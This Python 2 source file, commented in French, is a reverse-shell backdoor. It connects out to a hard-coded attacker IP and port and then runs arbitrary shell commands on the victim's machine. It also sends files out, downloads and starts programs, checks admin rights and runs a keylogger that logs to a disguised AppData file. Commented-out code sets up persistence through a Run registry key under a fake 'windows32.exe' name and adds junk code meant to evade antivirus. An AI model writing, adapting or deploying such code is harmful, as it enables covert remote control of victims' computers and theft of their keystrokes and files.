#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
#import requests #va savoir pk mais requests marche pas en le compilant sur windows, remplace par urllib
import urllib
#from mss import mss #ya que ca qui marche pas sur windows
import threading
import keylogger #le nom de notre keylogger dans le mm repertoire

iptoconnect = "192.168.1.27" #si on fait une attaque a travers internet avec port forward, il faut l'ip publique du routeur, et le port forward du routeur
porttoconnect = 51234


def reliable_send(data): #pour envoyer plus de 1024 bits
	json_data = json.dumps(data, ensure_ascii=False)
	#print "json data"
	#print json_data
	sock.send(json_data)
	print "reliable send"

def reliable_recv():
	data = "" #empty
	while True:
		try:
			data = data + sock.recv(1024)
			print "receiving data:"
			#print data
			#print(type(data))
			#print "json_data:"
			#print(type(json.loads(data.decode('utf-8','ignore'))))
			#print json.loads(data.decode('utf-8','ignore'))
			return json.loads(data.decode('utf-8','ignore')) #une fois que c bon y a tout dans data
		except ValueError:
			continue #si on recoit plus de 1024 on continue

def is_admin():
	global admin
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp'])) #on teste l'acces au dossier temp accessible que en admin
	except:
		admin = "[!!] User Privileges ! "
	else: #si ca marche
		admin = "[+] Administrator Privileges !"

def screenshot():
	#with mss() as screenshot: #n'importe quel nom
		#screenshot.shot()
        print "nothing screenshot"

def download(url):
	#get_response = requests.get(url)
	#file_name = url.split("/")[-1] #nom = derniere partie de l'url
	get_response = urllib.urlretrieve(url, url.split("/")[-1])
	#with open(file_name, "wb") as out_file:
	#	out_file.write(get_response.encode('utf-8')) #write le contenu du fichier telecharge

def connection():
	if quit == False:
		time.sleep(5) #dort 20s
		try:
			sock.connect((iptoconnect,porttoconnect))
			shell()
		except:
			connection()

def shell():
	while True:
		command = reliable_recv() #value max
		if command == 'q':
			quit = True
			break
		elif command == "help":
			help_options = '''					download path --> Download a file from target PC
					upload path   --> Upload a file to target PC
					get url       --> Download a file to target PC from a url
					start path    --> Start a program on target pc
					screenshot    --> Take a screenshot of target monitor
					check         --> Check for the admin privileges
					q             --> exit the reverse shell '''
			reliable_send(help_options)
		elif command[:2] == "cd" and len(command) > 1: #si commande commence par cd et il y a plus de 1 arg
			try:
				os.chdir(command[3:]) #change le directory en le directory specifie dans les []
			except:
				continue
		elif command[:8] == "download":
			with open(command[9:],"rb") as file: #on open the file to read bytes
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] == "upload":
			with open(command[7:], "wb") as fin: #write bytes
				print "upload fonction"
				file_data = reliable_recv()
				print "code"
				print (file_data)
				print "decode"
				print base64.b64decode(file_data)
				print "dedecode"
				recv= base64.b64decode(base64.b64decode(file_data))
				print recv
				fin.write(recv)
		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+] Downloaded file from specified URL !")
			except:
				reliable_send("[!!] Failed to download that file")
		elif command[:10] == "screenshot":
			try:
				screenshot()
				print "screenshot shot"
				with open("monitor-1.png","rb") as sc: #tjrs ce nom la
					reliable_send(base64.b64encode(sc.read()))
					print "image envoyee"
				os.remove("monitor-1.png") #on supprime le screenshot direct apres l'avoir envoye
			except:
				reliable_send("[!!] Failed to take Screenshot")
		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("[+] Started")
			except:
				reliable_send("[!!] Failed to start")
		elif command[:5] == "check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("Can't perform the check")
		elif command[:12] == "keylog_start":
			t1 = threading.Thread(target=keylogger.start) #on va run la fontion start de notre keylogger dans un threak
			t1.start() #on start le thread
		elif command[:11] == "keylog_dump": #on recupere les donnes receillies par le keylogger
			fn = open(keylogger_path, "r")
			reliable_send(fn.read())
		else:
			print "command :"
			print type(command)
			print command
			try:
				proc = subprocess.Popen(command.encode('utf-8','ignore'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				print "subprocess"
				result = proc.stdout.read() + proc.stderr.read()
				print "result"
				print result
				reliable_send(result)
			except:
				continue

keylogger_path = os.environ["appdata"] + "\\processmanager.txt" #nom du fichier qui sera ds appdata, le mm que ds keylogger.py

#location = os.environ["appdata"] + "\\windows32.exe" #ca va trouver le path appdata sur la target pc
#if not os.path.exists(location): #on veut creer un fichier seulement s'il existe pas
#	shutil.copyfile(sys.executable,location) #copie l'executable currently running
#	#pas oblige
#	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windows32 /t REG_SZ /d "' + location + '"', shell=True) #va creer un cle de registre qui va run notre file apres chaque redemarrage, backdoor on met le nom qu'on veut

	#seulement la 1ere fois
#	file_name = sys._MEIPASS + "\kali.png" #file name du fichier qu on va "emuler"'
#	try:
#		subprocess.Popen(file_name, shell=True)
#	except: #on fait des trucs inutiles qui peuvent aider a bypass les antivirus
#		number = 1
#		number2 = 2
#		number3 = number + number2


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

global quit
quit = False

#sock.connect((iptoconnect,porttoconnect))
#shell()
connection()

sock.close()
